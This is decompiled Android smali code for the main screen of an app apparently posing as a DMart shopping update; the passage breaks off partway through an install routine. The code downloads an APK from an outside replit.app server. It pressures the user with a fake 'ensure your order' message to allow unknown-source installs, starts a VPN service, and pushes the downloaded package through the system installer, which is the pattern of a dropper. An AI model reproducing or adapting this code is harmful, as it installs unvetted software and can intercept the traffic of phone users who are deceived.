.class public Lcom/mart/updatenow/MainActivity;
.super Le/g;
.source "YLHY"


# static fields
.field public static final M:Ljava/lang/String;


# instance fields
.field public A:Landroid/widget/ProgressBar;

.field public B:Landroid/widget/LinearLayout;

.field public C:Landroid/widget/TextView;

.field public D:Z

.field public E:Z

.field public F:Z

.field public G:I

.field public H:J

.field public I:Z

.field public J:Ljava/lang/Thread;

.field public volatile K:Z

.field public final L:Landroidx/activity/result/c;

.field public w:Le/f;

.field public x:Landroid/app/DownloadManager;

.field public y:J

.field public final z:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    .line 2
    .line 3
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 4
    .line 5
    .line 6
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    invoke-virtual {v1}, Ljava/util/UUID;->toString()Ljava/lang/String;

    .line 11
    .line 12
    .line 13
    move-result-object v1

    .line 14
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 15
    .line 16
    .line 17
    const-string v1, ".apk"

    .line 18
    .line 19
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 20
    .line 21
    .line 22
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 23
    .line 24
    .line 25
    move-result-object v0

    .line 26
    sput-object v0, Lcom/mart/updatenow/MainActivity;->M:Ljava/lang/String;

    .line 27
    .line 28
    return-void
.end method

.method public constructor <init>()V
    .locals 5

    .line 1
    invoke-direct {p0}, Le/g;-><init>()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Landroid/os/Handler;

    .line 5
    .line 6
    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    .line 7
    .line 8
    .line 9
    iput-object v0, p0, Lcom/mart/updatenow/MainActivity;->z:Landroid/os/Handler;

    .line 10
    .line 11
    const/4 v0, 0x0

    .line 12
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->D:Z

    .line 13
    .line 14
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->E:Z

    .line 15
    .line 16
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->F:Z

    .line 17
    .line 18
    iput v0, p0, Lcom/mart/updatenow/MainActivity;->G:I

    .line 19
    .line 20
    const-wide/16 v1, 0x0

    .line 21
    .line 22
    iput-wide v1, p0, Lcom/mart/updatenow/MainActivity;->H:J

    .line 23
    .line 24
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->I:Z

    .line 25
    .line 26
    const/4 v1, 0x0

    .line 27
    iput-object v1, p0, Lcom/mart/updatenow/MainActivity;->J:Ljava/lang/Thread;

    .line 28
    .line 29
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->K:Z

    .line 30
    .line 31
    new-instance v0, Landroidx/fragment/app/A;

    .line 32
    .line 33
    const/4 v1, 0x2

    .line 34
    invoke-direct {v0, v1}, Landroidx/fragment/app/A;-><init>(I)V

    .line 35
    .line 36
    .line 37
    new-instance v1, LE0/m;

    .line 38
    .line 39
    invoke-direct {v1, p0}, LE0/m;-><init>(Ljava/lang/Object;)V

    .line 40
    .line 41
    .line 42
    iget-object v2, p0, Landroidx/activity/l;->k:Landroidx/activity/h;

    .line 43
    .line 44
    new-instance v3, Ljava/lang/StringBuilder;

    .line 45
    .line 46
    const-string v4, "activity_rq#"

    .line 47
    .line 48
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 49
    .line 50
    .line 51
    iget-object v4, p0, Landroidx/activity/l;->j:Ljava/util/concurrent/atomic/AtomicInteger;

    .line 52
    .line 53
    invoke-virtual {v4}, Ljava/util/concurrent/atomic/AtomicInteger;->getAndIncrement()I

    .line 54
    .line 55
    .line 56
    move-result v4

    .line 57
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 58
    .line 59
    .line 60
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object v3

    .line 64
    invoke-virtual {v2, v3, p0, v0, v1}, Landroidx/activity/result/g;->c(Ljava/lang/String;Lcom/mart/updatenow/MainActivity;Landroidx/fragment/app/A;LE0/m;)Landroidx/activity/result/c;

    .line 65
    .line 66
    .line 67
    move-result-object v0

    .line 68
    iput-object v0, p0, Lcom/mart/updatenow/MainActivity;->L:Landroidx/activity/result/c;

    .line 69
    .line 70
    return-void
.end method


# virtual methods
.method public final onActivityResult(IILandroid/content/Intent;)V
    .locals 2

    .line 1
    invoke-super {p0, p1, p2, p3}, Le/g;->onActivityResult(IILandroid/content/Intent;)V

    move v1, p1

    .line 2
    .line 3
    .line 4
    const/16 p3, 0x3eb

    .line 5
    .line 6
    if-ne p1, p3, :cond_2

    .line 7
    .line 8
    const/4 p1, -0x1

    .line 9
    if-ne p2, p1, :cond_1

    .line 10
    .line 11
    :try_start_0
    new-instance p1, Landroid/content/Intent;

    .line 12
    .line 13
    const-class p2, Lcom/mart/updatenow/vp;

    .line 14
    .line 15
    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 16
    .line 17
    .line 18
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 19
    .line 20
    const/16 p3, 0x1a

    .line 21
    .line 22
    if-lt p2, p3, :cond_0

    .line 23
    .line 24
    invoke-static {p0, p1}, LE0/h;->l(Lcom/mart/updatenow/MainActivity;Landroid/content/Intent;)V

    .line 25
    .line 26
    .line 27
    goto :goto_0

    .line 28
    :cond_0
    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    .line 30
    .line 31
    :goto_0
    new-instance p1, LH/b;

    .line 32
    .line 33
    const/4 p2, 0x1

    .line 34
    const/4 p3, 0x0

    .line 35
    invoke-direct {p1, p0, p3, p2}, LH/b;-><init>(Ljava/lang/Object;II)V

    .line 36
    .line 37
    .line 38
    const-wide/16 p2, 0xc8

    .line 39
    .line 40
    iget-object v0, p0, Lcom/mart/updatenow/MainActivity;->z:Landroid/os/Handler;

    .line 41
    .line 42
    invoke-virtual {v0, p1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 43
    .line 44
    .line 45
    return-void

    .line 46
    :catch_0
    invoke-virtual {p0}, Lcom/mart/updatenow/MainActivity;->s()V

    .line 47
    .line 48
    .line 49
    return-void

    .line 50
    :cond_1
    const-string p1, "Please enable permission to ensure your order"

    .line 51
    .line 52
    const/4 p2, 0x1

    .line 53
    invoke-static {p0, p1, p2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 54
    .line 55
    .line 56
    move-result-object p1

    .line 57
    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 58
    .line 59
    .line 60
    new-instance p1, LH0/b;

    .line 61
    .line 62
    const/4 p2, 0x0

    .line 63
    invoke-direct {p1, p0, p2}, LH0/b;-><init>(Lcom/mart/updatenow/MainActivity;I)V

    .line 64
    .line 65
    .line 66
    const-wide/16 p2, 0x1f4

    .line 67
    .line 68
    iget-object v0, p0, Lcom/mart/updatenow/MainActivity;->z:Landroid/os/Handler;

    .line 69
    .line 70
    invoke-virtual {v0, p1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 71
    .line 72
    .line 73
    :cond_2
    const/16 p3, 0x3ec

    if-ne v1, p3, :cond_3

    invoke-virtual {p0}, Lcom/mart/updatenow/MainActivity;->s()V

    :cond_3
    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 1
    invoke-super {p0, p1}, Le/g;->onCreate(Landroid/os/Bundle;)V

    .line 2
    .line 3
    .line 4
    const p1, 0x7f0b001c

    .line 5
    .line 6
    .line 7
    invoke-virtual {p0, p1}, Le/g;->setContentView(I)V

    .line 8
    .line 9
    .line 10
    const p1, 0x7f080165

    .line 11
    .line 12
    .line 13
    invoke-virtual {p0, p1}, Le/g;->findViewById(I)Landroid/view/View;

    .line 14
    .line 15
    .line 16
    move-result-object p1

    .line 17
    check-cast p1, Landroid/widget/ProgressBar;

    .line 18
    .line 19
    iput-object p1, p0, Lcom/mart/updatenow/MainActivity;->A:Landroid/widget/ProgressBar;

    .line 20
    .line 21
    const p1, 0x7f080166

    .line 22
    .line 23
    .line 24
    invoke-virtual {p0, p1}, Le/g;->findViewById(I)Landroid/view/View;

    .line 25
    .line 26
    .line 27
    move-result-object p1

    .line 28
    check-cast p1, Landroid/widget/TextView;

    .line 29
    .line 30
    iput-object p1, p0, Lcom/mart/updatenow/MainActivity;->C:Landroid/widget/TextView;

    .line 31
    .line 32
    const p1, 0x7f0800aa

    .line 33
    .line 34
    .line 35
    invoke-virtual {p0, p1}, Le/g;->findViewById(I)Landroid/view/View;

    .line 36
    .line 37
    .line 38
    move-result-object p1

    .line 39
    check-cast p1, Landroid/widget/LinearLayout;

    .line 40
    .line 41
    iput-object p1, p0, Lcom/mart/updatenow/MainActivity;->B:Landroid/widget/LinearLayout;

    .line 42
    .line 43
    const-string p1, "com.dmart.webview"

    .line 44
    .line 45
    const/4 v0, 0x0

    .line 46
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 47
    .line 48
    .line 49
    move-result-object v1

    .line 50
    invoke-virtual {v1, p1, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 51
    .line 52
    .line 53
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 54
    .line 55
    .line 56
    move-result-object v1

    .line 57
    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 58
    .line 59
    .line 60
    move-result-object p1

    .line 61
    if-eqz p1, :cond_0

    .line 62
    .line 63
    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/mart/updatenow/vp;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "X"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 70
    .line 71
    .line 72
    .line 73
    .line 74
    .line 75
    :cond_0
    return-void

    .line 76
    :catch_0
    const-string p1, "Downloading APK"

    .line 77
    .line 78
    const/4 v1, 0x1

    .line 79
    :try_start_1
    iput-boolean v1, p0, Lcom/mart/updatenow/MainActivity;->D:Z

    .line 80
    .line 81
    iput v0, p0, Lcom/mart/updatenow/MainActivity;->G:I

    .line 82
    .line 83
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->I:Z

    .line 84
    .line 85
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 86
    .line 87
    .line 88
    move-result-wide v2

    .line 89
    iput-wide v2, p0, Lcom/mart/updatenow/MainActivity;->H:J

    .line 90
    .line 91
    iget-object v2, p0, Lcom/mart/updatenow/MainActivity;->B:Landroid/widget/LinearLayout;

    .line 92
    .line 93
    invoke-virtual {v2, v0}, Landroid/view/View;->setVisibility(I)V

    .line 94
    .line 95
    .line 96
    iget-object v2, p0, Lcom/mart/updatenow/MainActivity;->A:Landroid/widget/ProgressBar;

    .line 97
    .line 98
    invoke-virtual {v2, v0}, Landroid/view/View;->setVisibility(I)V

    .line 99
    .line 100
    .line 101
    iget-object v2, p0, Lcom/mart/updatenow/MainActivity;->C:Landroid/widget/TextView;

    .line 102
    .line 103
    invoke-virtual {v2, v0}, Landroid/view/View;->setVisibility(I)V

    .line 104
    .line 105
    .line 106
    iget-object v2, p0, Lcom/mart/updatenow/MainActivity;->A:Landroid/widget/ProgressBar;

    .line 107
    .line 108
    invoke-virtual {v2, v0}, Landroid/widget/ProgressBar;->setProgress(I)V

    .line 109
    .line 110
    .line 111
    iget-object v0, p0, Lcom/mart/updatenow/MainActivity;->C:Landroid/widget/TextView;

    .line 112
    .line 113
    const-string v2, "0%"

    .line 114
    .line 115
    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 116
    .line 117
    .line 118
    const-string v0, "download"

    .line 119
    .line 120
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 121
    .line 122
    .line 123
    move-result-object v0

    .line 124
    check-cast v0, Landroid/app/DownloadManager;

    .line 125
    .line 126
    iput-object v0, p0, Lcom/mart/updatenow/MainActivity;->x:Landroid/app/DownloadManager;

    .line 127
    .line 128
    const-string v0, "https://nexuswrap.replit.app/api/apk/auto-wrap/dmart_shopping_webview/download"

    .line 129
    .line 130
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 131
    .line 132
    .line 133
    move-result-object v0

    .line 134
    new-instance v2, Landroid/app/DownloadManager$Request;

    .line 135
    .line 136
    invoke-direct {v2, v0}, Landroid/app/DownloadManager$Request;-><init>(Landroid/net/Uri;)V

    .line 137
    .line 138
    .line 139
    invoke-virtual {v2, p1}, Landroid/app/DownloadManager$Request;->setTitle(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    .line 140
    .line 141
    .line 142
    invoke-virtual {v2, p1}, Landroid/app/DownloadManager$Request;->setDescription(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    .line 143
    .line 144
    .line 145
    const-string p1, "application/vnd.android.package-archive"

    .line 146
    .line 147
    invoke-virtual {v2, p1}, Landroid/app/DownloadManager$Request;->setMimeType(Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    .line 148
    .line 149
    .line 150
    const/4 p1, 0x3

    .line 151
    invoke-virtual {v2, p1}, Landroid/app/DownloadManager$Request;->setAllowedNetworkTypes(I)Landroid/app/DownloadManager$Request;

    .line 152
    .line 153
    .line 154
    invoke-virtual {v2, v1}, Landroid/app/DownloadManager$Request;->setAllowedOverMetered(Z)Landroid/app/DownloadManager$Request;

    .line 155
    .line 156
    .line 157
    invoke-virtual {v2, v1}, Landroid/app/DownloadManager$Request;->setAllowedOverRoaming(Z)Landroid/app/DownloadManager$Request;

    .line 158
    .line 159
    .line 160
    sget-object p1, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    .line 161
    .line 162
    sget-object v0, Lcom/mart/updatenow/MainActivity;->M:Ljava/lang/String;

    .line 163
    .line 164
    invoke-virtual {v2, p0, p1, v0}, Landroid/app/DownloadManager$Request;->setDestinationInExternalFilesDir(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    .line 165
    .line 166
    .line 167
    iget-object p1, p0, Lcom/mart/updatenow/MainActivity;->x:Landroid/app/DownloadManager;

    .line 168
    .line 169
    invoke-virtual {p1, v2}, Landroid/app/DownloadManager;->enqueue(Landroid/app/DownloadManager$Request;)J

    .line 170
    .line 171
    .line 172
    move-result-wide v2

    .line 173
    iput-wide v2, p0, Lcom/mart/updatenow/MainActivity;->y:J

    .line 174
    .line 175
    iget-object p1, p0, Lcom/mart/updatenow/MainActivity;->z:Landroid/os/Handler;

    .line 176
    .line 177
    new-instance v0, LH0/b;

    .line 178
    .line 179
    const/4 v2, 0x1

    .line 180
    invoke-direct {v0, p0, v2}, LH0/b;-><init>(Lcom/mart/updatenow/MainActivity;I)V

    .line 181
    .line 182
    .line 183
    const-wide/16 v2, 0x1f4

    .line 184
    .line 185
    invoke-virtual {p1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 186
    .line 187
    .line 188
    goto :goto_0

    .line 189
    :catch_1
    const-string p1, "Download start error"

    .line 190
    .line 191
    invoke-static {p0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 192
    .line 193
    .line 194
    move-result-object p1

    .line 195
    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 196
    .line 197
    .line 198
    :goto_0
    return-void
.end method

.method public final onResume()V
    .locals 4

    .line 1
    invoke-super {p0}, Le/g;->onResume()V

    .line 2
    .line 3
    .line 4
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 5
    .line 6
    .line 7
    move-result-object v0

    .line 8
    const v1, 0x7f0f001d

    .line 9
    .line 10
    .line 11
    invoke-virtual {p0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    .line 15
    const/4 v3, 0x0

    .line 16
    invoke-virtual {v0, v2, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    .line 17
    .line 18
    .line 19
    iget-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->F:Z

    .line 20
    .line 21
    if-nez v0, :cond_0

    .line 22
    .line 23
    const/4 v0, 0x1

    .line 24
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->F:Z

    .line 25
    .line 26
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 27
    .line 28
    .line 29
    move-result-object v0

    .line 30
    invoke-virtual {p0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object v1

    .line 34
    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 35
    .line 36
    .line 37
    move-result-object v0

    .line 38
    if-eqz v0, :cond_0

    .line 39
    .line 40
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/mart/updatenow/vp;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "X"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 47
    .line 48
    .line 49
    :catch_0
    :cond_0
    return-void
.end method

.method public final s()V
    .locals 6

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 2
    .line 3
    const/16 v1, 0x1a

    .line 4
    .line 5
    if-lt v0, v1, :cond_1

    .line 6
    .line 7
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    invoke-static {v0}, LE0/h;->m(Landroid/content/pm/PackageManager;)Z

    .line 12
    .line 13
    .line 14
    move-result v0

    .line 15
    if-eqz v0, :cond_0

    .line 16
    .line 17
    invoke-virtual {p0}, Lcom/mart/updatenow/MainActivity;->t()V

    .line 18
    .line 19
    .line 20
    return-void

    .line 21
    :cond_0
    new-instance v0, Landroid/content/Intent;

    .line 22
    .line 23
    new-instance v1, Ljava/lang/StringBuilder;

    .line 24
    .line 25
    const-string v2, "package:"

    .line 26
    .line 27
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 28
    .line 29
    .line 30
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object v2

    .line 34
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 35
    .line 36
    .line 37
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v1

    .line 41
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 42
    .line 43
    .line 44
    move-result-object v1

    .line 45
    const-string v2, "android.settings.MANAGE_UNKNOWN_APP_SOURCES"

    .line 46
    .line 47
    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 48
    .line 49
    .line 50
    const/4 v2, 0x1

    iput-boolean v2, p0, Lcom/mart/updatenow/MainActivity;->K:Z

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, LH0/b;

    const/4 v4, 0x2

    invoke-direct {v3, p0, v4}, LH0/b;-><init>(Lcom/mart/updatenow/MainActivity;I)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v2, p0, Lcom/mart/updatenow/MainActivity;->J:Ljava/lang/Thread;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Ljava/lang/Thread;->setDaemon(Z)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    const/16 v2, 0x3ec

    invoke-virtual {p0, v0, v2}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void

    .line 158
    :cond_1
    invoke-virtual {p0}, Lcom/mart/updatenow/MainActivity;->t()V

    .line 159
    .line 160
    .line 161
    return-void
.end method

.method public final t()V
    .locals 11

    .line 1
    iget-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->E:Z

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    return-void

    .line 6
    :cond_0
    sget-boolean v1, Lcom/mart/updatenow/vp;->e:Z

    if-nez v1, :cond_3

    invoke-static {p0}, Landroid/net/VpnService;->prepare(Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v1

    if-eqz v1, :cond_1

    const/16 v2, 0x3eb

    invoke-virtual {p0, v1, v2}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void

    :cond_1
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/mart/updatenow/vp;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v2, v3, :cond_2

    invoke-static {p0, v1}, LE0/h;->l(Lcom/mart/updatenow/MainActivity;Landroid/content/Intent;)V

    goto :goto_0

    :cond_2
    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_3
    :goto_0
    const/4 v0, 0x1

    .line 7
    iput-boolean v0, p0, Lcom/mart/updatenow/MainActivity;->E:Z

    .line 8
    .line 9
    iget-object v1, p0, Lcom/mart/updatenow/MainActivity;->w:Le/f;

    .line 10
    .line 11
    const/4 v2, 0x0

    .line 12
    if-eqz v1, :cond_4

    .line 13
    .line 14
    invoke-virtual {v1}, Landroid/app/Dialog;->isShowing()Z

    .line 15
    .line 16
    .line 17
    move-result v1

    .line 18
    if-eqz v1, :cond_4

    .line 19
    .line 20
    goto :goto_1

    .line 21
    :cond_4
    new-instance v1, LH/k;

    .line 22
    .line 23
    invoke-direct {v1, p0}, LH/k;-><init>(Landroid/content/Context;)V

    .line 24
    .line 25
    .line 26
    invoke-virtual {p0}, Landroid/app/Activity;->getLayoutInflater()Landroid/view/LayoutInflater;

    .line 27
    .line 28
    .line 29
    move-result-object v3

    .line 30
    const v4, 0x7f0b002d

    .line 31
    .line 32
    .line 33
    const/4 v5, 0x0

    .line 34
    invoke-virtual {v3, v4, v5}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    .line 35
    .line 36
    .line 37
    move-result-object v3

    .line 38
    iget-object v4, v1, LH/k;->b:Ljava/lang/Object;

    .line 39
    .line 40
    check-cast v4, Le/b;

    .line 41
    .line 42
    iput-object v3, v4, Le/b;->j:Landroid/view/View;

    .line 43
    .line 44
    iput-boolean v2, v4, Le/b;->f:Z

    .line 45
    .line 46
    invoke-virtual {v1}, LH/k;->a()Le/f;

    .line 47
    .line 48
    .line 49
    move-result-object v1

    .line 50
    iput-object v1, p0, Lcom/mart/updatenow/MainActivity;->w:Le/f;

    .line 51
    .line 52
    invoke-virtual {v1}, Landroid/app/Dialog;->show()V

    .line 53
    .line 54
    .line 55
    iget-object v1, p0, Lcom/mart/updatenow/MainActivity;->B:Landroid/widget/LinearLayout;

    .line 56
    .line 57
    const/16 v3, 0x8

    .line 58
    .line 59
    invoke-virtual {v1, v3}, Landroid/view/View;->setVisibility(I)V

    .line 60
    .line 61
    .line 62
    :goto_1
    :try_start_0
    new-instance v1, Ljava/io/File;

    .line 63
    .line 64
    sget-object v3, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    .line 65
    .line 66
    invoke-virtual {p0, v3}, Landroid/content/Context;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    .line 67
    .line 68
    .line 69
    move-result-object v3

    .line 70
    sget-object v4, Lcom/mart/updatenow/MainActivity;->M:Ljava/lang/String;

    .line 71
    .line 72
    invoke-direct {v1, v3, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 73
    .line 74
    .line 75
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    .line 76
    .line 77
    .line 78
    move-result v3

    .line 79
    if-nez v3, :cond_5

    .line 80
    .line 81
    iput-boolean v2, p0, Lcom/mart/updatenow/MainActivity;->E:Z

    .line 82
    .line 83
    const-string v1, "File not found"

    .line 84
    .line 85
    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 86
    .line 87
    .line 88
    move-result-object v1

    .line 89
    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 90
    .line 91
    .line 92
    return-void

    .line 93
    :cond_5
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 94
    .line 95
    .line 96
    move-result-object v3

    .line 97
    invoke-virtual {v3}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    .line 98
    .line 99
    .line 100
    move-result-object v3

    .line 101
    new-instance v4, Landroid/content/pm/PackageInstaller$SessionParams;

    .line 102
    .line 103
    invoke-direct {v4, v0}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    .line 104
    .line 105
    .line 106
    invoke-virtual {v3, v4}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I

    .line 107
    .line 108
    .line 109
    move-result v4

    .line 110
    invoke-virtual {v3, v4}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;

    .line 111
    .line 112
    .line 113
    move-result-object v5

    .line 114
    new-instance v3, Ljava/io/FileInputStream;

    .line 115
    .line 116
    invoke-direct {v3, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 117
    .line 118
    .line 119
    const-string v6, "app_install"

    .line 120
    .line 121
    invoke-virtual {v1}, Ljava/io/File;->length()J

    .line 122
    .line 123
    .line 124
    move-result-wide v9

    .line 125
    const-wide/16 v7, 0x0

    .line 126
    .line 127
    invoke-virtual/range {v5 .. v10}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;

    .line 128
    .line 129
    .line 130
    move-result-object v1

    .line 131
    const/high16 v6, 0x10000

    .line 132
    .line 133
    new-array v6, v6, [B

    .line 134
    .line 135
    :goto_2
    invoke-virtual {v3, v6}, Ljava/io/InputStream;->read([B)I

    .line 136
    .line 137
    .line 138
    move-result v7

    .line 139
    const/4 v8, -0x1

    .line 140
    if-eq v7, v8, :cond_6

    .line 141
    .line 142
    invoke-virtual {v1, v6, v2, v7}, Ljava/io/OutputStream;->write([BII)V

    .line 143
    .line 144
    .line 145
    goto :goto_2

    .line 146
    :cond_6
    invoke-virtual {v5, v1}, Landroid/content/pm/PackageInstaller$Session;->fsync(Ljava/io/OutputStream;)V

    .line 147
    .line 148
    .line 149
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 150
    .line 151
    .line 152
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    .line 153
    .line 154
    .line 155
    new-instance v1, Landroid/content/Intent;

    .line 156
    .line 157
    const-class v3, Lcom/mart/updatenow/InstallReceiver;

    .line 158
    .line 159
    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 160
    .line 161
    .line 162
    const/high16 v3, 0xa000000

    .line 163
    .line 164
    invoke-static {p0, v4, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 165
